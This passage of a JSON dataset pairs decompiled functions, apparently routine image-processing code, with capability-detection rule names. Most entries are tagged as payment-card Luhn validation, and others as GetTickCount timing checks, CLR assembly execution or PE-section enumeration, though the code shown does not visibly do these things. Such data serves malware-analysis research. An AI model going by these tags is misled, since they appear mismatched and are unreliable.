        "decompiled_code": "\nvoid fcn.0047e6d4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iVar2 = *(in_EAX + 0x13c);\n    iVar3 = (***(in_EAX + 4))();\n    *(iVar1 + 0x38) = iVar3;\n    *(iVar1 + 0x3c) = iVar3 + *(in_EAX + 0x24) * 4;\n    iStack16 = *(in_EAX + 0xd8);\n    for (iVar3 = 0; iVar3 < *(in_EAX + 0x24); iVar3 = iVar3 + 1) {\n        iVar4 = (*(iStack16 + 0xc) * *(iStack16 + 0x24)) / *(in_EAX + 0x13c);\n        iVar5 = (***(in_EAX + 4))();\n        iVar5 = iVar5 + iVar4 * 4;\n        *(*(iVar1 + 0x38) + iVar3 * 4) = iVar5;\n        *(*(iVar1 + 0x3c) + iVar3 * 4) = iVar5 + (iVar2 + 4) * iVar4 * 4;\n        iStack16 = iStack16 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "0047e8e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047e8e4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint *puStack24;\n    uint *puStack20;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iVar2 = *(in_EAX + 0x13c);\n    iStack32 = 0;\n    iStack28 = *(in_EAX + 0xd8);\n    for (; iStack32 < *(in_EAX + 0x24); iStack32 = iStack32 + 1) {\n        iVar5 = (*(iStack28 + 0xc) * *(iStack28 + 0x24)) / *(in_EAX + 0x13c);\n        puVar3 = *(*(iVar1 + 0x38) + iStack32 * 4);\n        puVar4 = *(*(iVar1 + 0x3c) + iStack32 * 4);\n        iVar6 = 0;\n        puStack24 = puVar3;\n        puStack20 = puVar4;\n        if (0 < iVar5) {\n            do {\n                puVar3[iVar6 - iVar5] = puVar3[(iVar2 + 1) * iVar5 + iVar6];\n                puVar4[iVar6 - iVar5] = puVar4[(iVar2 + 1) * iVar5 + iVar6];\n                puVar3[(iVar2 + 2) * iVar5 + iVar6] = *puStack24;\n                puVar4[(iVar2 + 2) * iVar5 + iVar6] = *puStack20;\n                iVar6 = iVar6 + 1;\n                puStack20 = puStack20 + 1;\n                puStack24 = puStack24 + 1;\n            } while (iVar6 < iVar5);\n        }\n        iStack28 = iStack28 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "0047fee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047fee4(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(*(in_EAX + 0x1b0) + 0x10);\n    uVar2 = arg_8h - *arg_ch;\n    if (uVar1 < arg_8h - *arg_ch) {\n        uVar2 = uVar1;\n    }\n    var_ch = 0;\n    var_4h = in_EAX;\n    (**(*(in_EAX + 0x1c4) + 4))(uVar2, &var_ch, *(*(in_EAX + 0x1b0) + 0xc), arg_14h);\n    (**(*(var_4h + 0x1cc) + 4))(var_ch);\n    *arg_ch = *arg_ch + var_ch;\n    return;\n}\n",
        "token_count": 256
    },
    "00480384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480384(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar1 = (***(in_EAX + 4))(param_1);\n    *(in_EAX + 0x1c0) = puVar1;\n    *puVar1 = 0x480130;\n    puVar1 = puVar1 + 0xb;\n    iVar3 = *(in_EAX + 0xd8);\n    for (iVar4 = 0; iVar4 < *(in_EAX + 0x24); iVar4 = iVar4 + 1) {\n        uVar2 = (***(in_EAX + 4))();\n        *(iVar3 + 0x50) = uVar2;\n        fcn.00476ba0(*(iVar3 + 0x50), 0, 0x100);\n        *puVar1 = 0xffffffff;\n        puVar1 = puVar1 + 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00480418": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480418(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_1ch;\n    code **var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    if (*(in_EAX + 0x138) <= *(iVar1 + 0x5c)) {\n        var_18h = iVar1 + 0x34;\n        for (var_ch = 0; var_ch < *(in_EAX + 0x24); var_ch = var_ch + 1) {\n            (**var_18h)(var_ch * 4 + iVar1 + 0xc);\n            var_18h = var_18h + 1;\n        }\n        *(iVar1 + 0x5c) = 0;\n    }\n    var_14h = *(in_EAX + 0x138) - *(iVar1 + 0x5c);\n    if (*(iVar1 + 0x60) < var_14h) {\n        var_14h = *(iVar1 + 0x60);\n    }\n    uVar2 = arg_8h - *arg_ch;\n    if (uVar2 < var_14h) {\n        var_14h = uVar2;\n    }\n    (**(*(in_EAX + 0x1c8) + 4))(var_14h, *arg_ch * 4 + arg_10h);\n    *arg_ch = *arg_ch + var_14h;\n    *(iVar1 + 0x60) = *(iVar1 + 0x60) - var_14h;\n    iVar3 = *(iVar1 + 0x5c) + var_14h;\n    *(iVar1 + 0x5c) = iVar3;\n    if (*(in_EAX + 0x138) <= iVar3) {\n        *in_ECX = *in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 513
    },
    "004805f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004805f0(uint *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = *arg_8h;\n    for (var_8h = 0; var_8h < *(in_EAX + 0x138); var_8h = var_8h + 1) {\n        puVar3 = *in_ECX;\n        puVar2 = *var_ch;\n        puVar4 = puVar2 + *(in_EAX + 0x70);\n        for (; puVar2 < puVar4; puVar2 = puVar2 + 2) {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            *puVar2 = uVar1;\n            puVar2[1] = uVar1;\n        }\n        var_ch = var_ch + 1;\n        in_ECX = in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "0048064c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0048064c(uint *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uchar *puVar2;\n    uint *in_ECX;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = *arg_8h;\n    var_10h = in_ECX;\n    for (var_ch = 0; var_ch < *(in_EAX + 0x138); var_ch = var_ch + 2) {\n        puVar2 = *var_14h;\n        puVar4 = puVar2 + *(in_EAX + 0x70);\n        puVar3 = *var_10h;\n        for (; puVar2 < puVar4; puVar2 = puVar2 + 2) {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            *puVar2 = uVar1;\n            puVar2[1] = uVar1;\n        }\n        fcn.004837d4(*(in_EAX + 0x70), 1, var_ch + 1);\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 2;\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "004806dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004806dc(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t in_EAX;\n    uint8_t **in_ECX;\n    int32_t in_EDX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = *arg_8h;\n    for (var_ch = 0; var_ch < *(in_EAX + 0x138); var_ch = var_ch + 1) {\n        puVar2 = *var_10h;\n        uVar1 = **in_ECX;\n        puVar4 = *in_ECX + 1;\n        *puVar2 = uVar1;\n        puVar2[1] = uVar1 * 3 + *puVar4 + 2 >> 2;\n        for (iVar5 = *(in_EDX + 0x28) + -2; puVar3 = puVar2 + 2,  iVar5 != 0; iVar5 = iVar5 + -1) {\n            uVar1 = *puVar4;\n            *puVar3 = puVar4[-1] + uVar1 * 3 + 1 >> 2;\n            puVar2[3] = uVar1 * 3 + puVar4[1] + 2 >> 2;\n            puVar4 = puVar4 + 1;\n            puVar2 = puVar3;\n        }\n        uVar1 = *puVar4;\n        *puVar3 = uVar1 * 3 + puVar4[-1] + 1 >> 2;\n        puVar2[3] = uVar1;\n        var_10h = var_10h + 1;\n        in_ECX = in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "00481918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481918(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    \n    *(*arg_ch + arg_8h) = *(*(in_EAX + 0x144) + 0x80 + (*in_ECX * **(in_EDX + 0x50) + 4 >> 3 & 0x3ffU));\n    return;\n}\n",
        "token_count": 114
    },
    "00483650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00483650(void)\n\n{\n    int32_t in_EAX;\n    code **ppcVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    \n    ppcVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b8) = ppcVar1;\n    *ppcVar1 = fcn.00483618;\n    ppcVar2 = ppcVar1 + 8;\n    ppcVar1[1] = 0x48317c;\n    ppcVar1[2] = 0x48348c;\n    ppcVar1[7] = fcn.00482f30;\n    ppcVar1[0x18] = NULL;\n    iVar3 = 0;\n    do {\n        *ppcVar2 = fcn.00482f30;\n        ppcVar2[0x11] = NULL;\n        iVar3 = iVar3 + 1;\n        ppcVar2 = ppcVar2 + 1;\n    } while (iVar3 < 0x10);\n    ppcVar1[8] = 0x482ac8;\n    ppcVar1[0x16] = 0x482ac8;\n    fcn.00483618();\n    return;\n}\n",
        "token_count": 288
    },
    "004837bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004837bc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX + param_2 + -1;\n    return iVar1 - iVar1 % param_2;\n}\n",
        "token_count": 69
    },
    "004837d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004837d4(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *puVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    puVar1 = in_EAX + in_EDX * 4;\n    puVar2 = in_ECX + arg_10h * 4;\n    if (0 < arg_ch) {\n        do {\n            arg_ch_00 = *puVar1;\n            puVar1 = puVar1 + 1;\n            arg_8h_00 = *puVar2;\n            puVar2 = puVar2 + 1;\n            fcn.00476bb4(arg_8h_00, arg_ch_00, arg_8h);\n            arg_ch = arg_ch + -1;\n        } while (0 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00483830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00483830(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    fcn.00476ba0(in_EAX, 0, param_2);\n    return;\n}\n",
        "token_count": 51
    },
    "00483ac8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00483ac8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX < 1) {\n        in_EAX = 1;\n    }\n    if (100 < in_EAX) {\n        in_EAX = 100;\n    }\n    if (in_EAX < 0x32) {\n        iVar1 = 5000 / in_EAX;\n    }\n    else {\n        iVar1 = in_EAX * -2 + 200;\n    }\n    return iVar1;\n}\n",
        "token_count": 123
    },
    "00484124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00484124(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_EAX;\n    uint in_ECX;\n    uint in_EDX;\n    \n    *in_EAX = 1;\n    in_EAX[1] = in_EDX;\n    in_EAX[5] = in_ECX;\n    in_EAX[6] = arg_10h;\n    in_EAX[7] = arg_ch;\n    in_EAX[8] = arg_8h;\n    return in_EAX + 9;\n}\n",
        "token_count": 128
    },
    "0048414c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048414c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_EAX;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < in_EDX) {\n        do {\n            *in_EAX = 1;\n            in_EAX[1] = iVar1;\n            in_EAX[5] = in_ECX;\n            in_EAX[6] = arg_10h;\n            iVar1 = iVar1 + 1;\n            in_EAX[7] = arg_ch;\n            in_EAX[8] = arg_8h;\n            in_EAX = in_EAX + 9;\n        } while (iVar1 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00484188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00484188(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    \n    if (in_EDX < 5) {\n        *in_EAX = in_EDX;\n        iVar2 = 0;\n        piVar1 = in_EAX + 1;\n        if (0 < in_EDX) {\n            do {\n                *piVar1 = iVar2;\n                iVar2 = iVar2 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar2 < in_EDX);\n        }\n        in_EAX[6] = 0;\n        in_EAX[5] = 0;\n        in_EAX[7] = in_ECX;\n        in_EAX[8] = arg_8h;\n        piVar1 = in_EAX + 9;\n    }\n    else {\n        piVar1 = fcn.0048414c(arg_8h, in_ECX, 0);\n    }\n    return piVar1;\n}\n",
        "token_count": 258
    },
    "004845cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004845cc(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    in_EAX[1] = 0;\n    if (param_2 != 0x3e) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xc;\n        *(iVar2 + 0x18) = 0x3e;\n        *(iVar2 + 0x1c) = param_2;\n        (***in_EAX)();\n    }\n    if (param_1 != 0x174) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x15;\n        *(iVar2 + 0x18) = 0x174;\n        *(iVar2 + 0x1c) = param_1;\n        (***in_EAX)();\n    }\n    iVar2 = *in_EAX;\n    iVar1 = in_EAX[3];\n    fcn.00476ba0(in_EAX, 0, 0x174);\n    *in_EAX = iVar2;\n    in_EAX[3] = iVar1;\n    in_EAX[4] = 0;\n    fcn.004790a4();\n    in_EAX[2] = 0;\n    in_EAX[6] = 0;\n    piVar3 = in_EAX + 0x11;\n    in_EAX[0x10] = 0;\n    iVar2 = 0;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar3 = in_EAX + 0x15;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3[4] = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    in_EAX[0x5b] = 0;\n    in_EAX[0xb] = 0;\n    in_EAX[0xc] = 0x3ff00000;\n    in_EAX[5] = 100;\n    return;\n}\n",
        "token_count": 541
    },
    "004846a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004846a4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x44;\n    do {\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0x80) = param_2;\n        }\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar1 = in_EAX + 0x54;\n    do {\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0x114) = param_2;\n        }\n        if (piVar1[4] != 0) {\n            *(piVar1[4] + 0x114) = param_2;\n        }\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 256
    },
    "004861bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004861bc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_EAX;\n    uint *arg_ch;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t iStack32;\n    uint *puStack24;\n    uint *puStack20;\n    \n    iVar4 = *(in_EAX + 0x150);\n    iVar2 = *(in_EAX + 0xe8);\n    puStack24 = (***(in_EAX + 4))();\n    puStack20 = iVar4 + 8;\n    for (iStack32 = 0; iStack32 < *(in_EAX + 0x38); iStack32 = iStack32 + 1) {\n        arg_ch = (**(*(in_EAX + 4) + 8))(iVar2 * 3);\n        fcn.00476bb4(puStack24 + iVar2, arg_ch, iVar2 * 0xc);\n        iVar4 = 0;\n        puVar5 = arg_ch;\n        puVar6 = puStack24;\n        if (0 < iVar2) {\n            do {\n                *puVar6 = arg_ch[iVar4 + iVar2 * 2];\n                iVar1 = iVar4 + iVar2 * 4;\n                iVar4 = iVar4 + 1;\n                puVar6 = puVar6 + 1;\n                uVar3 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puStack24[iVar1] = uVar3;\n            } while (iVar4 < iVar2);\n        }\n        *puStack20 = puStack24 + iVar2;\n        puStack24 = puStack24 + iVar2 * 5;\n        puStack20 = puStack20 + 1;\n    }\n    return;\n}\n",
        "token_count": 408
    },
    "00486c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486c20(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    uint8_t **in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *var_20h;\n    uchar *var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x15c) + 8);\n    uVar2 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar3 = *var_4h;\n        var_4h = var_4h + 1;\n        var_18h = *(*in_ECX + arg_ch * 4);\n        var_1ch = *(in_ECX[1] + arg_ch * 4);\n        var_20h = *(in_ECX[2] + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        var_10h = 0;\n        if (uVar2 != 0) {\n            do {\n                uVar5 = puVar3[2];\n                uVar4 = puVar3[1];\n                uVar6 = *puVar3;\n                puVar3 = puVar3 + 3;\n                *var_18h = *(iVar1 + uVar5 * 4) + *(iVar1 + 0x400 + uVar4 * 4) + *(iVar1 + 0x800 + uVar6 * 4) >> 0x10;\n                *var_1ch = *(iVar1 + 0xc00 + uVar5 * 4) + *(iVar1 + 0x1000 + uVar4 * 4) + *(iVar1 + 0x1400 + uVar6 * 4)\n                           >> 0x10;\n                *var_20h = *(iVar1 + 0x1400 + uVar5 * 4) + *(iVar1 + 0x1800 + uVar4 * 4) + *(iVar1 + 0x1c00 + uVar6 * 4)\n                           >> 0x10;\n                var_10h = var_10h + 1;\n                var_20h = var_20h + 1;\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + 1;\n            } while (var_10h < uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 670
    },
    "00486d28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486d28(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_EAX;\n    uint8_t *puVar6;\n    int32_t *in_ECX;\n    uchar *puVar7;\n    uint8_t **in_EDX;\n    uint32_t uVar8;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar4 = *(*(in_EAX + 0x15c) + 8);\n    uVar5 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar6 = *var_4h;\n        var_4h = var_4h + 1;\n        puVar7 = *(*in_ECX + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        uVar8 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = uVar8 + 1;\n                puVar1 = puVar6 + 2;\n                puVar2 = puVar6 + 1;\n                uVar3 = *puVar6;\n                puVar6 = puVar6 + 3;\n                *puVar7 = *(iVar4 + *puVar1 * 4) + *(iVar4 + 0x400 + *puVar2 * 4) + *(iVar4 + 0x800 + uVar3 * 4) >> 0x10\n                ;\n                puVar7 = puVar7 + 1;\n            } while (uVar8 < uVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 464
    },
    "00486db4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486db4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    uint8_t *puVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint8_t **in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *var_28h;\n    uchar *var_24h;\n    uchar *var_20h;\n    uint8_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar2 = *(*(in_EAX + 0x15c) + 8);\n    uVar3 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar4 = *var_4h;\n        var_4h = var_4h + 1;\n        var_20h = *(*in_ECX + arg_ch * 4);\n        var_24h = *(in_ECX[1] + arg_ch * 4);\n        var_28h = *(in_ECX[2] + arg_ch * 4);\n        var_1ch = *(in_ECX[3] + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        var_14h = 0;\n        if (uVar3 != 0) {\n            do {\n                iVar6 = 0xff - *puVar4;\n                iVar5 = 0xff - puVar4[1];\n                iVar7 = 0xff - puVar4[2];\n                puVar1 = puVar4 + 3;\n                puVar4 = puVar4 + 4;\n                *var_1ch = *puVar1;\n                *var_20h = *(iVar2 + iVar6 * 4) + *(iVar2 + 0x400 + iVar5 * 4) + *(iVar2 + 0x800 + iVar7 * 4) >> 0x10;\n                *var_24h = *(iVar2 + 0xc00 + iVar6 * 4) + *(iVar2 + 0x1000 + iVar5 * 4) + *(iVar2 + 0x1400 + iVar7 * 4)\n                           >> 0x10;\n                *var_28h = *(iVar2 + 0x1400 + iVar6 * 4) + *(iVar2 + 0x1800 + iVar5 * 4) + *(iVar2 + 0x1c00 + iVar7 * 4)\n                           >> 0x10;\n                var_14h = var_14h + 1;\n                var_28h = var_28h + 1;\n                var_24h = var_24h + 1;\n                var_20h = var_20h + 1;\n                var_1ch = var_1ch + 1;\n            } while (var_14h < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 751
    },
    "00486ef8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486ef8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t *in_ECX;\n    uint *in_EDX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_EAX + 0x1c);\n    iVar2 = *(in_EAX + 0x24);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar4 = *in_EDX;\n        in_EDX = in_EDX + 1;\n        puVar3 = *(*in_ECX + arg_ch * 4);\n        uVar5 = 0;\n        arg_ch = arg_ch + 1;\n        if (uVar1 != 0) {\n            do {\n                uVar5 = uVar5 + 1;\n                *puVar3 = *puVar4;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + iVar2;\n            } while (uVar5 < uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00486f44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00486f44(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(in_EAX + 0x38);\n    uVar2 = *(in_EAX + 0x1c);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_4h = 0;\n        var_10h = in_ECX;\n        if (0 < iVar1) {\n            do {\n                uVar5 = 0;\n                iVar4 = *in_EDX;\n                puVar3 = *(*var_10h + arg_ch * 4);\n                if (uVar2 != 0) {\n                    do {\n                        uVar5 = uVar5 + 1;\n                        *puVar3 = *(iVar4 + var_4h);\n                        puVar3 = puVar3 + 1;\n                        iVar4 = iVar4 + iVar1;\n                    } while (uVar5 < uVar2);\n                }\n                var_4h = var_4h + 1;\n                var_10h = var_10h + 1;\n            } while (var_4h < iVar1);\n        }\n        in_EDX = in_EDX + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "0048725c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
